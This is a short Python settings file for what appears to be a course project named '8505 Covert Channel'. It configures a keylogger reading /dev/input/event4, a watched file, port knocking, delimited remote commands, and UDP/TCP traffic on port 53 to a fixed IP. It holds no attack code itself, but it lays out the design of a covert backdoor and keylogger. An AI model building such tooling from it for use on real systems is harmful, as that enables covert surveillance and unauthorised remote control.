# Encryption key for symmetrical encryption
KEY = 'encryption.key'
# Target port for incoming commands (not port knocks)
TARGET_PORT = 53
TARGET_IP = "192.168.0.9"
PROTOCOL = {
    "UDP": 1,
    "TCP": 0,
}
# List of files to watch
FILE_WATCH = "test.txt"

KEYLOG_FILE = "keylog.log"

KEYLOG_DEVICE = "/dev/input/event4"
# This port opens up when port knock successful
PORT_KNOCK_TARGET_PORT = 8005


# Packet Payload Identifier
IDENTIFIER = b"////"
# If the received command does not have these two keywords in it, then the message is ignored
COMMAND_START = "start["
COMMAND_END = "]end"
# Process name
PROCESS_TITLE = "8505 Covert Channel"
# Cutoff for UDP payload length in bytes
MAX_PAYLOAD_SIZE = 1200
